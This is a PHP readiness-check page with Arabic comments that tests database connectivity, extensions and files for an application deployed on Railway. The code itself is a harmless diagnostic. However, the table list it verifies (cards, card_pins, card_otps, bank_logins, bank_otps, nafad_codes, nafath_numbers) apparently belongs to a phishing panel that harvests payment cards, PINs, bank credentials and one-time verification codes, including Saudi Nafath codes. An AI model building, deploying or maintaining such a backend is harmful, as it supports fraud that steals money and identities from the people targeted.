<?php
/**
 * اختبار الاتصال بقاعدة البيانات + فحص الجداول الأساسية لتطبيقكم.
 *
 * الاستخدام على Railway:
 *   أضف في خدمة التطبيق المتغير: ALLOW_DB_TEST=true
 *   ثم افتح: https://YOUR_DOMAIN/test_db_connection.php
 * بعد التأكد: احذف المتغير و(يفضل) احذف هذا الملف من الإنتاج.
 */

header('Content-Type: text/html; charset=utf-8');

$allowed = getenv('ALLOW_DB_TEST') === 'true';
if (!$allowed) {
    echo '<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><title>اختبار الاتصال</title></head><body>';
    echo '<p>لتشغيل صفحة الاختبار أضف المتغير <code>ALLOW_DB_TEST=true</code> في خدمة التطبيق على Railway، ثم أعد النشر وحدّث الصفحة.</p>';
    echo '<p>الغرض من القفل: عدم كشف حالة قاعدة البيانات لكل زائر.</p>';
    echo '</body></html>';
    exit;
}

require_once __DIR__ . '/dashboard/config.php';

$requiredPhp = '7.4';
$requiredExtensions = ['pdo', 'pdo_mysql', 'mysqli', 'json', 'session'];

$expectedTables = [
    'admin',
    'users',
    'settings',
    'visits',
    'cards',
    'card_otps',
    'card_pins',
    'bank_logins',
    'bank_otps',
    'nafad_codes',
    'nafad_logs',
    'nafad_requests',
    'nafath_numbers',
];

function row(string $label, bool $ok, string $detail = ''): string
{
    $icon = $ok ? '✓' : '✗';
    $color = $ok ? '#0a0' : '#c00';
    $s = '<tr><td style="padding:6px;border-bottom:1px solid #eee;">' . htmlspecialchars($label) . '</td>';
    $s .= '<td style="padding:6px;border-bottom:1px solid #eee;color:' . $color . ';">' . $icon . '</td>';
    $s .= '<td style="padding:6px;border-bottom:1px solid #eee;font-size:0.9em;">' . htmlspecialchars($detail) . '</td></tr>';
    return $s;
}

$checks = [];
$allOk = true;

// PHP
$phpOk = version_compare(PHP_VERSION, $requiredPhp, '>=');
$allOk = $allOk && $phpOk;
$checks[] = row('إصدار PHP (≥ ' . $requiredPhp . ')', $phpOk, PHP_VERSION);

// Extensions
foreach ($requiredExtensions as $ext) {
    $loaded = extension_loaded($ext);
    $allOk = $allOk && $loaded;
    $checks[] = row('امتداد ' . $ext, $loaded, $loaded ? 'مفعّل' : 'غير مفعّل — فعّله في صورة PHP');
}

// Config display (بدون كشف كلمة المرور)
$mask = DB_PASSWORD !== '' ? str_repeat('•', min(12, strlen(DB_PASSWORD))) : '(فارغة)';
$checks[] = row(
    'إعدادات الاتصال (من المتغيرات)',
    true,
    'Host: ' . DB_HOST . ' | Port: ' . DB_PORT . ' | User: ' . DB_USER . ' | DB: ' . DB_NAME . ' | Pass: ' . $mask
);

$pdoOk = false;
$mysqliOk = false;
$pdoDetail = '';
$mysqliDetail = '';

// PDO
try {
    $dsn = 'mysql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME . ';charset=utf8mb4';
    $pdo = new PDO($dsn, DB_USER, DB_PASSWORD, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $pdo->query('SELECT 1');
    $pdoOk = true;
    $pdoDetail = 'PDO: اتصال ناجح';
} catch (Throwable $e) {
    $pdoDetail = 'PDO: ' . $e->getMessage();
    $allOk = false;
}

$checks[] = row('اتصال PDO (كما في لوحة التحكم)', $pdoOk, $pdoDetail);

// mysqli
try {
    $mysqli = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME, DB_PORT);
    if ($mysqli) {
        mysqli_set_charset($mysqli, 'utf8mb4');
        mysqli_query($mysqli, 'SELECT 1');
        $mysqliOk = true;
        $mysqliDetail = 'mysqli: اتصال ناجح';
        mysqli_close($mysqli);
    } else {
        $mysqliDetail = 'mysqli: ' . mysqli_connect_error();
        $allOk = false;
    }
} catch (Throwable $e) {
    $mysqliDetail = 'mysqli: ' . $e->getMessage();
    $allOk = false;
}

$checks[] = row('اتصال mysqli', $mysqliOk, $mysqliDetail);

// الجداول
$tablesOk = true;
$tablesDetail = '';

if ($pdoOk) {
    try {
        $dsn = 'mysql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME . ';charset=utf8mb4';
        $pdo = new PDO($dsn, DB_USER, DB_PASSWORD, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $stmt = $pdo->query(
            'SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = ' . $pdo->quote(DB_NAME)
        );
        $existing = [];
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $existing[] = $row['TABLE_NAME'];
        }

        $missing = array_diff($expectedTables, $existing);
        if (count($missing) > 0) {
            $tablesOk = false;
            $allOk = false;
            $tablesDetail = 'ناقص: ' . implode(', ', $missing) . ' — شغّل install_database.php بعد السماح ALLOW_DB_INSTALL';
        } else {
            $tablesDetail = 'موجودة (' . count($expectedTables) . ' جدول متوقع). إجمالي الجداول في القاعدة: ' . count($existing);
        }
    } catch (Throwable $e) {
        $tablesOk = false;
        $allOk = false;
        $tablesDetail = $e->getMessage();
    }
} else {
    $tablesOk = false;
    $tablesDetail = 'تخطي — فشل PDO';
    $allOk = false;
}

$checks[] = row('جداول التطبيق الأساسية', $tablesOk, $tablesDetail);

// ملفات حيوية
$pathOk = true;
$paths = [
    'dashboard/config.php',
    'dashboard/db-config.php',
    'dashboard/init.php',
    'dashboard/classes/db.php',
    'vendor/autoload.php',
];
$pathNotes = [];
foreach ($paths as $rel) {
    $full = __DIR__ . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $rel);
    $exists = is_readable($full);
    if (!$exists) {
        $pathOk = false;
        $allOk = false;
    }
    $pathNotes[] = ($exists ? '✓ ' : '✗ ') . $rel;
}
$checks[] = row('ملفات أساسية للموقع', $pathOk, implode(' | ', $pathNotes));

$verdict = $allOk
    ? 'من ناحية قاعدة البيانات والامتدادات والملفات المفحوصة: الجاهزية تبدو جيدة. جرّب الصفحات الفعلية (تسجيل دخول، نماذج) للتأكد الكامل.'
    : 'يوجد فشل أو نقص — راجع الصفوف الحمراء أعلاه قبل اعتبار الموقع جاهزاً للإنتاج.';

echo '<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">';
echo '<title>اختبار الاتصال والجاهزية</title>';
echo '<style>body{font-family:Segoe UI,Tahoma,sans-serif;background:#f5f5f8;margin:0;padding:1.5rem;}';
echo '.box{max-width:920px;margin:0 auto;background:#fff;border-radius:12px;padding:1.5rem;box-shadow:0 2px 12px rgba(0,0,0,.08);}';
echo 'h1{margin-top:0;font-size:1.25rem;} table{width:100%;border-collapse:collapse;} .verdict{margin-top:1.25rem;padding:1rem;border-radius:8px;} .ok{background:#e8f5e9;border:1px solid #c8e6c9;} .bad{background:#ffebee;border:1px solid #ffcdd2;}</style></head><body>';
echo '<div class="box">';
echo '<h1>نتيجة فحص الاتصال والجاهزية</h1>';
echo '<table><thead><tr><th style="text-align:right;padding:8px;">البند</th><th>حالة</th><th style="text-align:right;">تفاصيل</th></tr></thead><tbody>';
echo implode('', $checks);
echo '</tbody></table>';
echo '<div class="verdict ' . ($allOk ? 'ok' : 'bad') . '"><strong>الخلاصة:</strong> ' . htmlspecialchars($verdict) . '</div>';
echo '<p style="font-size:0.85em;color:#666;">بعد الانتهاء: احذف <code>ALLOW_DB_TEST</code> من Railway واحذف أو أعد تسمية ملف <code>test_db_connection.php</code>.</p>';
echo '</div></body></html>';
